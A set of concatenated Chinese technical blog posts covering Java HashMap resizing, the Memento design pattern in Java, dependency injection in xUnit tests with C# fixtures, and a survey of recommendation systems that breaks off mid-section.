                     oldCap >= DEFAULT_INITIAL_CAPACITY)
                newThr = oldThr << 1; // double threshold
        }
        else if (oldThr > 0) // initial capacity was placed in threshold
            newCap = oldThr;
        else {               // zero initial threshold signifies using defaults
            newCap = DEFAULT_INITIAL_CAPACITY;
            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);
        }
        if (newThr == 0) {
            float ft = (float)newCap * loadFactor;
            newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?
                      (int)ft : Integer.MAX_VALUE);
        }
        threshold = newThr;
        @SuppressWarnings({"rawtypes","unchecked"})
        Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];
        table = newTab;
       //如果原数组不为空，则取出数组中的元素，进行hash位置的重新计算，可以看到，重新计算耗时较多，所以尽量用多大数组就初始化多大最好。
        if (oldTab != null) {
            for (int j = 0; j < oldCap; ++j) {
                Node<K,V> e;
                if ((e = oldTab[j]) != null) {
                    oldTab[j] = null;
                    if (e.next == null)
                        newTab[e.hash & (newCap - 1)] = e;
                    else if (e instanceof TreeNode)
                        ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);
                    else { // preserve order
                        Node<K,V> loHead = null, loTail = null;
                        Node<K,V> hiHead = null, hiTail = null;
                        Node<K,V> next;
                        do {
                            next = e.next;
                            if ((e.hash & oldCap) == 0) {
                                if (loTail == null)
                                    loHead = e;
                                else
                                    loTail.next = e;
                                loTail = e;
                            }
                            else {
                                if (hiTail == null)
                                    hiHead = e;
                                else
                                    hiTail.next = e;
                                hiTail = e;
                            }
                        } while ((e = next) != null);
                        if (loTail != null) {
                            loTail.next = null;
                            newTab[j] = loHead;
                        }
                        if (hiTail != null) {
                            hiTail.next = null;
                            newTab[j + oldCap] = hiHead;
                        }
                    }
                }
            }
        }
        return newTab;
    } 

　　4. p = tab[i = (n - 1) & hash]
　　计算key的hash落在数组的哪个位置，它决定了数组长度为什么是2^n。主要是(n-1) & hash，这里就会用到上面hash()方法中，让1散列的作用。这个方法也决定了，为什么数组长度为2^n，下面我们具体解释一下。由于初始化中，n的值是resize方法返回的，resize中用到的就是tableSizeFor方法返回的2^n的值。如16，下面我举例说明，如数组长度是16：则n-1为15，二进制是 0000 1111与hash取与时，由于0与1/0都为0，所以我们只看后四位1111和hash的后四位。可以看到，与1111取与，可以得到0-15的值，这时，保证了hash能实现落在数组的所有下标。假想一下，如果数组长度为15或其他非二进制值，15-1=14,14的二进制为1110，由于最后一位是0，和任何二进制取与，最后一位都是0，则hash落不到数组下标为0,2,4,6,8,10,12,14的偶数下标，这样数据分布会更集中，加重每个下标Node的负担，且数组中很多下标无法利用。源码作者正是利用了2^n-1，得到二进制最后全为1，并且与hash相与后，能让hash分布覆盖数组所有下标上的特性。之前hash()方法通过HashCode与HashCode右移16位取异或，让1分布更加均匀，也是为了让hash在数组中的分布更加均匀，从而避免某个下标Node元素过多，效率下降，且过多元素会触发resize耗费时间的缺点，当然，可以看到极端情况下，hash()计算的值并不能解决hash碰撞问题，但是为了HashMap的性能设计者没有考虑该极端情况，也是通过16位hashCode右移8位来举例说明。
如：          1000 1000 0000 0000和1000 1100 0000 0000，如果不移位取异或，这两个hash值与1111取与，都是分布在同一位置，分布情况不良好。
右移8位： 1000 1000 1000 1000和1000 1100 1000 1100，可以看到两个值与1111取与分布在数组的两个下标。
极端情况：1000 0000 0000 0000和1100 0000 0000 0000，该值又移8为取异或后，并不能解决hash碰撞。
 
 
　　　     
 
 
　　
********************************************************************************************************************************************************************************************************
设计模式-备忘录模式
备忘录模式 : Memento
声明/作用 : 保存对象的内部状态,并在需要的时候(undo/rollback) 恢复到对象以前的状态
适用场景 : 一个对象需要保存状态,并且可通过undo或者rollback恢复到以前的状态时,可以使用备忘录模式
经典场景 : 某时刻游戏存档恢复记录
需要被保存内部状态以便恢复的这个类 叫做 : Originator 发起人(原生者)
用来保存Originator内部状态的类 叫做 : Memento 备忘录(回忆者) 它由Originator创建
负责管理备忘录Memento的类叫做 : Caretaker 看管者(管理者),它不能对Memento的内容进行访问或者操作。
以Person对象(拥有name,sex,age三个基本属性)为例 : 

package name.ealen.memento.noDesignPattern;

/**
 * Created by EalenXie on 2018/9/27 15:18.
 */
public class Person {

    private String name;
    private String sex;
    private Integer age;

    public Person(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }
    //省略getter,setter
}

 
如果不使用设计模式，我们要对其进行备份，undo操作 ,常规情况下，我们可能会写出如下的代码 : 
 

 /**
     * 不使用设计模式 实现备忘录模式,普通保存实例的内部状态
     */
    @Test
    public void noDesignPattern() {
        Person person = new Person("ealenxie", "男", 23);

        //1 . 首先新建一个Person的Backup备份,将对象的初始属性赋值进去
        Person backup = new Person();
        backup.setName(person.getName());
        backup.setSex(person.getSex());
        backup.setAge(person.getAge());
        //打印初始的person
        System.out.println("初始化的对象 : " + person);

        //2 . 修改person
        person.setAge(22);
        person.setName("ZHANG SAN");
        person.setSex("女");
        System.out.println("修改后的对象 : " + person);

        //3 . 回滚(回复以前状态) 从backup中获取之前的状态,重新赋值
        person.setAge(backup.getAge());
        person.setName(backup.getName());
        person.setSex(backup.getSex());
        System.out.println("还原后的对象 : " + person);
    }

运行可以看到基本效果 :  
　　　　
以上代码中，我们首先进行了创建了一个初始对象person，然后new出一个新的backup，将初始对象的属性赋给backup，person修改之后，如果进行undo/rollback，就将backup的属性重新赋值给对象person。这样做我们必须要关注person和backup之间的赋值关系必须一致且值正确，这样才能完成rollback动作；如果person对象拥有诸多属性及行为的话，很显示不是特别的合理。
 
如下，我们使用备忘录模式来完成对象的备份和rollback
　　1 . 首先，我们定义Memento对象，它的作用就是用来保存 初始对象(原生者，此例比如person)的内部状态，因此它的属性和原生者应该一致。

package name.ealen.memento.designPattern;

/**
 * Created by EalenXie on 2018/9/27 18:03.
 */
public class Memento {
    private String name;
    private String sex;
    private Integer age;
    public Memento(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }
    //省略getter/setter
}

 
　　2 . 然后，定义我们的发起人(原生者) Originator，它拥有两个基本的行为 : 
　　　　1). 创建备份
　　　　2). 根据备份进行rollback

package name.ealen.memento.designPattern;

/**
 * Created by EalenXie on 2018/9/27 18:02.
 */
public class Originator {

    private String name;
    private String sex;
    private Integer age;

    //创建一个备份
    public Memento createMemento() {
        return new Memento(name, sex, age);
    }

    //根据备份进行rollback
    public void rollbackByMemento(Memento memento) {
        this.name = memento.getName();
        this.sex = memento.getSex();
        this.age = memento.getAge();
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getSex() {
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

    public Integer getAge() {
        return age;
    }

    public void setAge(Integer age) {
        this.age = age;
    }

    public Originator(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Originator{" +
                "name='" + name + '\'' +
                ", sex='" + sex + '\'' +
                ", age=" + age +
                '}';
    }
}

 
　　3 . 为了防止发起者与备份对象的过度耦合，以及防止对发起者行和属性进行过多的代码侵入，我们通常将Memento对象交由CareTaker来进行管理 : 
 

package name.ealen.memento.designPattern;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by EalenXie on 2018/9/27 17:39.
 */
public class CareTaker {

    private Map<String, Memento> mementos = new HashMap<>(); //一个或者多个备份录

    //保存默认备份
    public void saveDefaultMemento(Memento memento) {
        mementos.put("default", memento);
    }

    //获取默认备份
    public Memento getMementoByDefault() {
        return mementos.get("default");
    }

    //根据备份名 保存备份
    public void saveMementoByName(String mementoName, Memento memento) {
        mementos.put(mementoName, memento);
    }

    //根据备份名 获取备份
    public Memento getMementoByName(String mementoName) {
        return mementos.get(mementoName);
    }

    //删除默认备份
    public void deleteDefaultMemento() {
        mementos.remove("default");
    }

    //根据备份名 删除备份
    public void deleteMementoByName(String mementoName) {
        mementos.remove(mementoName);
    }
}

 
　　4 . 此时，我们要进行备份以及rollback，做法如下 : 
 

    /**
     * 备忘录模式,标准实现
     */
    @Test
    public void designPattern() {
        Originator originator = new Originator("ealenxie", "男", 22);
        CareTaker careTaker = new CareTaker();

        //新建一个默认备份,将Originator的初始属性赋值进去
        careTaker.saveDefaultMemento(originator.createMemento());

        //初始化的Originator
        System.out.println("初始化的对象 : " + originator);

        //修改后的Originator
        originator.setName("ZHANG SAN");
        originator.setSex("女");
        originator.setAge(23);
        System.out.println("第一次修改后的对象 : " + originator);

        //新建一个修改后的备份
        careTaker.saveMementoByName("第一次修改备份", originator.createMemento());

        //根据默认备份还原rollback后的Originator
        originator.rollbackByMemento(careTaker.getMementoByDefault());
        System.out.println("还原后的对象 : " + originator);

        //根据备份名还原rollback后的Originator
        originator.rollbackByMemento(careTaker.getMementoByName("第一次修改备份"));
        System.out.println("第一次修改备份 : " + originator);

        //再创建一个默认备份
        careTaker.saveDefaultMemento(originator.createMemento());
        originator.rollbackByMemento(careTaker.getMementoByDefault());
        System.out.println("最后创建的默认备份 : " + originator);
    }

 
运行可以看到如下结果 : 
　　
 以上，使用备忘录的设计模式，好处是显而易见的，我们应该关注的是对象本身具有的(备份/rollback)的行为，而非对象之间的赋值。
 有兴趣的朋友可以看看以上源码 : https://github.com/EalenXie/DesignPatterns 
********************************************************************************************************************************************************************************************************
XUnit 依赖注入
XUnit 依赖注入
Intro
现在的开发中越来越看重依赖注入的思想，微软的 Asp.Net Core 框架更是天然集成了依赖注入，那么在单元测试中如何使用依赖注入呢？
本文主要介绍如何通过 XUnit 来实现依赖注入， XUnit 主要借助 SharedContext 来共享一部分资源包括这些资源的创建以及释放。
Scoped
针对 Scoped 的对象可以借助 XUnit 中的 IClassFixture 来实现

定义自己的 Fixture，需要初始化的资源在构造方法里初始化，如果需要在测试结束的时候释放资源需要实现 IDisposable 接口
需要依赖注入的测试类实现接口 IClassFixture<Fixture>
在构造方法中注入实现的 Fixture 对象，并在构造方法中使用 Fixture 对象中暴露的公共成员

Singleton
针对 Singleton 的对象可以借助 XUnit 中的 ICollectionFixture 来实现

定义自己的 Fixture，需要初始化的资源在构造方法里初始化，如果需要在测试结束的时候释放资源需要实现 IDisposable 接口
创建 CollectionDefinition，实现接口 ICollectionFixture<Fixture>，并添加一个 [CollectionDefinition("CollectionName")] Attribute，CollectionName 需要在整个测试中唯一，不能出现重复的 CollectionName
在需要注入的测试类中添加 [Collection("CollectionName")] Attribute，然后在构造方法中注入对应的 Fixture

Tips

如果有多个类需要依赖注入，可以通过一个基类来做，这样就只需要一个基类上添加 [Collection("CollectionName")] Attribute，其他类只需要集成这个基类就可以了

Samples
Scoped Sample
这里直接以 XUnit 的示例为例：
public class DatabaseFixture : IDisposable
{
    public DatabaseFixture()
    {
        Db = new SqlConnection("MyConnectionString");

        // ... initialize data in the test database ...
    }

    public void Dispose()
    {
        // ... clean up test data from the database ...
    }

    public SqlConnection Db { get; private set; }
}

public class MyDatabaseTests : IClassFixture<DatabaseFixture>
{
    DatabaseFixture fixture;

    public MyDatabaseTests(DatabaseFixture fixture)
    {
        this.fixture = fixture;
    }


    [Fact]
    public async Task GetTest()
    {
        // ... write tests, using fixture.Db to get access to the SQL Server ...
        // ... 在这里使用注入 的 DatabaseFixture
    }
}
Singleton Sample
这里以一个对 Controller 测试的测试为例

自定义 Fixture
    /// <summary>
    /// A test fixture which hosts the target project (project we wish to test) in an in-memory server.
    /// </summary>
    public class TestStartupFixture : IDisposable
    {
        private readonly IWebHost _server;
        public IServiceProvider Services { get; }

        public HttpClient Client { get; }

        public string ServiceBaseUrl { get; }

        public TestStartupFixture()
        {
            var builder = WebHost.CreateDefaultBuilder()
                .UseUrls($"http://localhost:{GetRandomPort()}")
                .UseStartup<TestStartup>();

            _server = builder.Build();
            _server.Start();

            var url = _server.ServerFeatures.Get<IServerAddressesFeature>().Addresses.First();
            Services = _server.Services;
            ServiceBaseUrl = $"{url}/api/";

            Client = new HttpClient()
            {
                BaseAddress = new Uri(ServiceBaseUrl)
            };

            Initialize();
        }

        /// <summary>
        /// TestDataInitialize
        /// </summary>
        private void Initialize()
        {
            // ...
        }

        public void Dispose()
        {
            Client.Dispose();
            _server.Dispose();
        }

        private static readonly Random Random = new Random();

        private static int GetRandomPort()
        {
            var activePorts = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners().Select(_ => _.Port).ToList();

            var randomPort = Random.Next(10000, 65535);

            while (activePorts.Contains(randomPort))
            {
                randomPort = Random.Next(10000, 65535);
            }

            return randomPort;
        }
    }
自定义Collection
    [CollectionDefinition("TestCollection")]
    public class TestCollection : ICollectionFixture<TestStartupFixture>
    {
    }
自定义一个 TestBase
    [Collection("TestCollection")]
    public class ControllerTestBase
    {
        protected readonly HttpClient Client;
        protected readonly IServiceProvider ServiceProvider;

        public ControllerTestBase(TestStartupFixture fixture)
        {
            Client = fixture.Client;
            ServiceProvider = fixture.Services;
        }
    }
需要依赖注入的Test类写法

    public class AttendancesTest : ControllerTestBase
    {
        public AttendancesTest(TestStartupFixture fixture) : base(fixture)
        {
        }

        [Fact]
        public async Task GetAttendances()
        {
            var response = await Client.GetAsync("attendances");
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);

            response = await Client.GetAsync("attendances?type=1");
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        }
    }
Reference

https://xunit.github.io/docs/shared-context.html

Contact
如果您有什么问题，欢迎随时联系我
Contact me: weihanli@outlook.com

********************************************************************************************************************************************************************************************************
学习这篇总结后，你也能做出头条一样的推荐系统
欢迎大家前往腾讯云+社区，获取更多腾讯海量技术实践干货哦~

本文由jj发表于云+社区专栏

一、推荐系统概述
1.1 概述
推荐系统目前几乎无处不在，主流的app都基本应用到了推荐系统。例如，旅游出行，携程、去哪儿等都会给你推荐机票、酒店等等；点外卖，饿了么、美团等会给你推荐饭店；购物的时候，京东、淘宝、亚马逊等会给你推荐“可能喜欢”的物品；看新闻，今日头条、腾讯新闻等都会给你推送你感兴趣的新闻....几乎所有的app应用或网站都存在推荐系统。
究其根本的原因，推荐系统的流行是因为要去解决一个问题：物品越来越多，信息越来越多，而人的精力和时间是有限的，需要一个方式去更有效率地获取信息，链接人与信息。
推荐系统就是为了解决这一问题而诞生的，在海量的物品和人之间，架起来一条桥梁。它就像一个私人的专属导购，根据你的历史行为、个人信息等等，为每个人diy进行推荐，千人前面，帮助人们更好、更快地选择自己感兴趣的、自己需要的东西。今日头条系的feed流在推荐算法的加持下，短短几年的用户增长速度和使用时长数据令人咂舌，受到了市场的追捧和高估值。一夜之间，几乎所有的app都开始上feed流、上各种推荐，重要性可见一斑。
1.2 基本架构
我们先把推荐系统简单来看，那么它可以简化为如下的架构。
图1 推荐系统一般流程
不管是复杂还是简单的推荐系统，基本都包含流程：

1）结果展示部分。不管是app还是网页上，会有ui界面用于展示推荐列表。
2）行为日志部分。用户的各种行为会被时刻记录并被上传到后台的日志系统，例如点击行为、购买行为、地理位置等等。这些数据后续一般会被进行ETL（extract抽取、transform转换、load加载），供迭代生成新模型进行预测。
3）特征工程部分。得到用户的行为数据、物品的特征、场景数据等等，需要人工或自动地去从原始数据中抽取出特征。这些特征作为输入，为后面各类推荐算法提供数据。特征选取很重要，错的特征必定带来错误的结果。
4）召回部分。 有了用户的画像，然后利用数据工程和算法的方式，从千万级的产品中锁定特定的候选集合，完成对推荐列表的初步筛选，其在一定程度上决定了排序阶段的效率和推荐结果的优劣。
5）排序部分。针对上一步的候选集合，会进行更精细化地打分、排序，同时考虑新颖性、惊喜度、商业利益等的一系列指标，获得一份最终的推荐列表并进行展示。

完整的推荐系统还会包括很多辅助模块，例如线下训练模块，让算法研究人员利用真实的历史数据，测试各类不同算法，初步验证算法优劣。线下测试效果不错的算法就会被放到线上测试，即常用的A/B test系统。它利用流量分发系统筛选特定的用户展示待测试算法生成的推荐列表，然后收集这批特定用户行为数据进行线上评测。
图2 蘑菇街推荐系统架构
推荐系统每个部分可大可小，从图2可知，各部分涉及的技术栈也较多。终端app每时每刻都在不断上报各类日志，点击、展示、时间、地理位置等等信息，这些海量信息需要依赖大数据相关软件栈支持，例如Kafka、spark、HDFS、Hive等，其中Kafka常被用于处理海量日志上报的消费问题。将数据进行ETL后存入Hive数据仓库，就可进行各类线上、线下测试使用。线下的算法会上线到线上环境进行ABtest，ABtest涉及完整的测试回路打通，不然拿不到结果，也无法快速开发迭代算法。线上推荐系统还要关注实时特征、离线特征，在性能和各类指标、商业目标间取均衡。
1.3 评测指标
一个东西做得好还是不好，能不能优化，首要前提是确定评测指标。只有确定了评测指标，才能有优化的方向。评测推荐系统的指标可以考虑以下几个方面：
1.3.1 用户满意度
用户作为推进系统的主要参与者，其满意度是评测系统的最重要指标。满意度可以通过做用户调查或线上实验获得。在在线系统中，一般通过对用户行为的统计得到，例如点击率、用户停留时间和转化率等指标度量用户的满意度。
1.3.2 预测精确度precision
预测准确度度量一个推荐系统或者推荐算法预测用户行为的能力。这个指标是最重要的离线评测指标。由于离线数据可计算，绝大部分科研人员都在讨论这个指标。
评分预测问题一般使用RMSE、MAE等，TopN预测问题一般使用Recall、Precision等。
图3 常见的指标准确率(Precision)、召回率(Recall)、误检率
其实目前国内很多地方和资料混淆了两个指标的叫法，把准确度对应英文precision指标。不过尽量还是用英文比较好。
准确度Accuracy = (TP + TN) / (TP + FP + TN + FN)
精确度Precision=TP/(TP+FP)
1.3.3 覆盖率coverage
覆盖率描述一个推荐系统对物品长尾的发掘能力。覆盖率有很多定义方法，最简单的计算就是推荐列表中的物品数量，除以所有的物品数量。
在信息论和经济学中有两个著名的指标用来定义覆盖率，一个是信息熵，一个是基尼系数。具体公式和介绍可以google。
ps：长尾在推荐系统中是个常见的名词。举个例子帮助大家理解，在商店里，由于货架和场地有限，摆在最显眼的地方的物品通常是出名的、热门的，从而销量也是最好的。很多不出名或者小知名度的商品由于在货架角落或者根本上不了货架，这些商品销量很差。在互联网时代，这一现象会被打破。电子商城拥有几乎无限长的“货架”，它可以为用户展现很多满足他小众需求的商品，这样总的销量加起来将远远超过之前的模式。
Google是一个最典型的“长尾”公司，其成长历程就是把广告商和出版商的“长尾”商业化的过程。数以百万计的小企业和个人，此前他们从未打过广告，或从没大规模地打过广告。他们小得让广告商不屑一顾，甚至连他们自己都不曾想过可以打广告。但Google的AdSense把广告这一门槛降下来了：广告不再高不可攀，它是自助的，价廉的，谁都可以做的；另一方面，对成千上万的Blog站点和小规模的商业网站来说，在自己的站点放上广告已成举手之劳。Google目前有一半的生意来自这些小网站而不是搜索结果中放置的广告。数以百万计的中小企业代表了一个巨大的长尾广告市场。这条长尾能有多长，恐怕谁也无法预知。无数的小数积累在一起就是一个不可估量的大数，无数的小生意集合在一起就是一个不可限量的大市场。
图4 长尾曲线
1.3.4多样性
用户的兴趣是多样的，推荐系统需要能覆盖用户各种方面的喜好。这里有个假设，如果推荐列表比较多样，覆盖了用户各种各样的兴趣，那么真实命中用户的兴趣概率也会越大，那么就会增加用户找到自己感兴趣的物品的概率。
1.3.5 新颖性
新颖的推荐是指给用户推荐那些他们以前没有听说过的物品。要准确地统计新颖性需要做用户调查。
1.3.6 惊喜度
如果推荐结果和用户的历史兴趣不相似，但却让用户觉得满意，那么就可以说推荐结果的惊喜度很高，而推荐的新颖性仅仅取决于用户是否听说过这个推荐结果。
1.3.7 信任度
用户对推荐系统的信任程度。如果用户信任推荐系统，那就会增加用户和推荐系统的交互。特别是在电子商务推荐系统中，让用户对推荐结果产生信任是非常重要的。同样的推荐结果，以让用户信任的方式推荐给用户就更能让用户产生购买欲，而以类似广告形式的方法推荐给用户就可能很难让用户产生购买的意愿。提高推荐系统的信任度主要有两种方法。首先需要增加推荐系统的透明度（transparency），而增加推荐系统透明度的主要办法是提供推荐解释。其次是考虑用户的社交网络信息，利用用户的好友信息给用户做推荐，并且用好友进行推荐解释。
1.3.8 实时性
在很多网站中，因为物品（新闻、微博等）具有很强的时效性，所以需要在物品还具有时效性时就将它们推荐给用户。因此，在这些网站中，推荐系统的实时性就显得至关重要。
推荐系统的实时性包括两个方面。首先，推荐系统需要实时地更新推荐列表来满足用户新的行为变化。实时性的第二个方面是推荐系统需要能够将新加入系统的物品推荐给用户。这主要考验了推荐系统处理物品冷启动的能力。
1.3.9 健壮性
衡量了一个推荐系统抗击作弊的能力。算法健壮性的评测主要利用模拟攻击。首先，给定一个数据集和一个算法，可以用这个算法给这个数据集中的用户生成推荐列表。然后，用常用的攻击方法向数据集中注入噪声数据，然后利用算法在注入噪声后的数据集上再次给用户生成推荐列表。最后，通过比较攻击前后推荐列表的相似度评测算法的健壮性。如果攻击后的推荐列表相对于攻击前没有发生大的变化，就说明算法比较健壮。
1.3.10 商业目标
很多时候，评测推荐系统更加注重商业目标是否达成，而商业目标和盈利模式是息息相关的。一般来说，最本质的商业目标就是平均一个用户给公司带来的盈利。不过这种指标不是很难计算，只是计算一次需要比较大的代价。因此，很多公司会根据自己的盈利模式设计不同的商业目标。
1.3.11 参考资料
推荐系统的评测问题有很多的相关研究和资料，预详细研究可阅读参考：

《推荐系统实战》
《Evaluating Recommendation Systems》
What metrics are used for evaluating recommender systems?

二、常用算法
推荐算法的演化可以简单分为3个阶段，也是推荐系统由简单到复杂的迭代。
2.1 推荐算法演化
2.1.1 人工运营
这个阶段是随机的，人工根据运营目的，手工给特定类别的用户推送特定的内容。
优点是：

方便推广特定的内容；
推荐的内容易解释；

缺点是：

千人一面，推送的内容一样；
人工筛选，推送，耗费人力巨大；
运营根据自己的知识，主观性比较大；

2.1.2 基于统计的推荐
会基于一些简单的统计学知识做推荐，例如某个内别卖得最好的热门榜；再细致一些，将用户按个人特质划分，再求各种热度榜等。
优点是：

热门就是大部分用户喜好的拟合，效果好；
推荐的内容易解释；

缺点是：

千人一面，推送的内容一样；
马太效应，热门的会越来越热门，冷门的越来越冷门；
效果很容易达到天花板；

2.1.3 个性化推荐
当前阶段的推荐，会基于协同过滤算法、基于模型的算法、基于社交关系等，机器学习、深度学习逐渐引入，提高了推荐效果。
优点是：

效果要相对于之前，要好很多；
千人前面，每个人都有自己独特的推荐列表；

缺点是：

门槛较高，推荐系统搭建、算法设计、调优等等，都对开发者有较高的要求；
成本较高，而且是个长期迭代优化的过程，人力物力投入很高；

2.2 推荐算法汇总
内部一个分享这样分类常用的推荐算法：
图5 推荐算法分类
这里提到的Memory-based算法和Model-based算法的差别是什么？这也是我之前关注的问题，找到个资料，讲解得比较透彻。
Memory-based techniques use the data (likes, votes, clicks, etc) that you have to establish correlations (similarities?) between either users (Collaborative Filtering) or items (Content-Based Recommendation) to recommend an item i to a user u who’s never seen it before. In the case of collaborative filtering, we get the recommendations from items seen by the user’s who are closest to u, hence the term collaborative. In contrast, content-based recommendation tries to compare items using their characteristics (movie genre, actors, book’s publisher or author… etc) to recommend similar new items.
In a nutshell, memory-based techniques rely heavily on simple similarity measures (Cosine similarity, Pearson correlation, Jaccard coefficient… etc) to match similar people or items together. If we have a huge matrix with users on one dimension and items on the other, with the cells containing votes or likes, then memory-based techniques use similarity measures on two vectors (rows or columns) of such a matrix to generate a number representing similarity.
Model-based techniques on the other hand try to further fill out this matrix. They tackle the task of “guessing” how much a user will like an item that they did not encounter before. For that they utilize several machine learning algorithms to train on the vector of items for a specific user, then they can build a model that can predict the user’s rating for a new item that has just been added to the system.
Since I’ll be working on news recommendations, the latter technique sounds much more interesting. Particularly since news items emerge very quickly (and disappear also very quickly), it makes sense that the system develops some smart way of detecting when a new piece of news will be interesting to the user even before other users see/rate it.
Popular model-based techniques are Bayesian Networks, Singular Value Decomposition, and Probabilistic Latent Semantic Analysis (or Probabilistic Latent Semantic Indexing). For some reason, all model-based techniques do not enjoy particularly happy-sounding names.

《携程个性化推荐算法实践》一文中梳理了工业界应用的排序模型，大致经历三个阶段：
图6 排序模型演进
本文不对上面的这些算法进行详细的原理探讨，会比较复杂，有兴趣可以再自行学习。
2.3 CF算法示例
为了学习这块的技术知识，跟着参加了下内部举办的srtc推荐比赛。重在参与，主要是学习整个基本流程，体会下推荐场景，了解腾讯内部做得好的团队和产品是什么样子。
2.3.1（内部敏感资料，删除）
2.3.2 CF算法
在web平台上点一点，可能失去了学习的意义。所以本着学习的态度，我在线下自己的机器上实现了一些常用的算法，例如CF等。
推荐算法里CF算是比较常见的，核心还是很简单的。

user-cf基本原理

A.找到和目标用户兴趣相似的的用户集合； B.找到这个集合中的用户喜欢的，且目标用户没听过的物品推荐给目标用户。

item-cf基本原理

A.计算物品之间的相似度； B.根据物品的相似度和用户的历史行为给用户生成推荐列表。
结合前面总结的，cf属于memory-base的算法，很大一个特征就是会用到相似度的函数。这个user-cf需要计算用户兴趣的相似度，item-cf需要计算物品间的相似度。基于相似度函数的选择、编程语言的选择、实现方式的选择、优化的不同，结果和整个运行时间会很大不同。当时就简单用python实现的，8个process跑满cpu同时处理，需要近10个小时跑完。后面了解到有底层进行过优化的pandas、numpy等，基于这些工具来实现速度会快很多。
2.3.3 收获
哈哈，第一次参加这种比赛，虽然成绩很差，但自己觉得很是学到很多东西，基本达到了参赛的目的。在真实的场景和数据下去思考各种影响因素，体会各种算法从设计、实现、训练、评价等各阶段，很多东西确实比看资料和书来得更深入。果然实践才是学习的最好手段。如果想更深入去搞推荐算法这块，感觉需要继续学习目前各种热门算法的原理、潜规则，kaggle上多练手，以及锻炼相关的平台及工程化能力。
三、业界推荐系统调研
收集、研究了下网上一些推荐系统落地总结的文章，可以开拓视野，加深整体理解。
以下只是一些重要内容，有兴趣可以阅读原文：

《今日头条算法原理》，原文链接
《推荐算法在闲鱼小商品池的探索与实践》，原文链接
《饿了么推荐系统：从0到1》，原文链接
《爱奇艺个性化推荐排序实践》，原文链接
《携程个性化推荐算法实践》，原文链接
《蘑菇街推荐工程实践》，原文链接

3.1 今日头条推荐系统
今日头条算法架构师曹欢欢博士，做过一次 《今日头条算法原理》的报告。主要涉及4部分：系统概览、内容分析、用户标签、评估分析。

四类典型推荐特征


第一类是相关性特征，就是评估内容的属性和与用户是否匹配。 第二类是环境特征，包括地理位置、时间。这些既是bias特征，也能以此构建一些匹配特征。 第三类是热度特征。包括全局热度、分类热度，主题热度，以及关键词热度等。 第四类是协同特征，它可以在部分程度上帮助解决所谓算法越推越窄的问题。

模型的训练上，头条系大部分推荐产品采用实时训练


模型的训练上，头条系大部分推荐产品采用实时训练。实时训练省资源并且反馈快，这对信息流产品非常重要。用户需要行为信息可以被模型快速捕捉并反馈至下一刷的推荐效果。我们线上目前基于storm集群实时处理样本数据，包括点击、展现、收藏、分享等动作类型。模型参数服务器是内部开发的一套高性能的系统，因为头条数据规模增长太快，类似的开源系统稳定性和性能无法满足，而我们自研的系统底层做了很多针对性的优化，提供了完善运维工具，更适配现有的业务场景。
目前，头条的推荐算法模型在世界范围内也是比较大的，包含几百亿原始特征和数十亿向量特征。整体的训练过程是线上服务器记录实时特征，导入到Kafka文件队列中，然后进一步导入Storm集群消费Kafka数据，客户端回传推荐的label构造训练样本，随后根据最新样本进行在线训练更新模型参数，最终线上模型得到更新。这个过程中主要的延迟在用户的动作反馈延时，因为文章推荐后用户不一定马上看，不考虑这部分时间，整个系统是几乎实时的。

但因为头条目前的内容量非常大，加上小视频内容有千万级别，推荐系统不可能所有内容全部由模型预估。所以需要设计一些召回策略，每次推荐时从海量内容中筛选出千级别的内容库。召回策略最重要的要求是性能要极致，一般超时不能超过50毫秒。

用户标签工程挑战更大


内容分析和用户标签是推荐系统的两大基石。内容分析涉及到机器学习的内容多一些，相比而言，用户标签工程挑战更大。 今日头条常用的用户标签包括用户感兴趣的类别和主题、关键词、来源、基于兴趣的用户聚类以及各种垂直兴趣特征（车型，体育球队，股票等）。还有性别、年龄、地点等信息。性别信息通过用户第三方社交账号登录得到。年龄信息通常由模型预测，通过机型、阅读时间分布等预估。常驻地点来自用户授权访问位置信息，在位置信息的基础上通过传统聚类的方法拿到常驻点。常驻点结合其他信息，可以推测用户的工作地点、出差地点、旅游地点。这些用户标签非常有助于推荐。

当然最简单的用户标签是浏览过的内容标签。但这里涉及到一些数据处理策略。主要包括：一、过滤噪声。通过停留时间短的点击，过滤标题党。二、热点惩罚。对用户在一些热门文章（如前段时间PG One的新闻）上的动作做降权处理。理论上，传播范围较大的内容，置信度会下降。三、时间衰减。用户兴趣会发生偏移，因此策略更偏向新的用户行为。因此，随着用户动作的增加，老的特征权重会随时间衰减，新动作贡献的特征权重会更大。四、惩罚展现。如果一篇推荐给用户的文章没有被点击，相关特征（类别，关键词，来源）权重会被惩罚。当然同时，也要考虑全局背景，是不是相关内容推送比较多，以及相关的关闭和dislike信号等。

Hadoop集群压力过大，上线 Storm集群流式计算系统


面对这些挑战。2014年底今日头条上线了用户标签Storm集群流式计算系统。改成流式之后，只要有用户动作更新就更新标签，CPU代价比较小，可以节省80%的CPU时间，大大降低了计算资源开销。同时，只需几十台机器就可以支撑每天数千万用户的兴趣模型更新，并且特征更新速度非常快，基本可以做到准实时。这套系统从上线一直使用至今。

很多公司算法做的不好，并非是工程师能力不够，而是需要一个强大的实验平台，还有便捷的实验分析工具


A/B test系统原理

这是头条A/B Test实验系统的基本原理。首先我们会做在离线状态下做好用户分桶，然后线上分配实验流量，将桶里用户打上标签，分给实验组。举个例子，开一个10%流量的实验，两个实验组各5%，一个5%是基线，策略和线上大盘一样，另外一个是新的策略。

实验过程中用户动作会被搜集，基本上是准实时，每小时都可以看到。但因为小时数据有波动，通常是以天为时间节点来看。动作搜集后会有日志处理、分布式统计、写入数据库，非常便捷。
3.2 推荐算法在闲鱼小商品池的探索与实践

闲鱼中个性化推荐流程


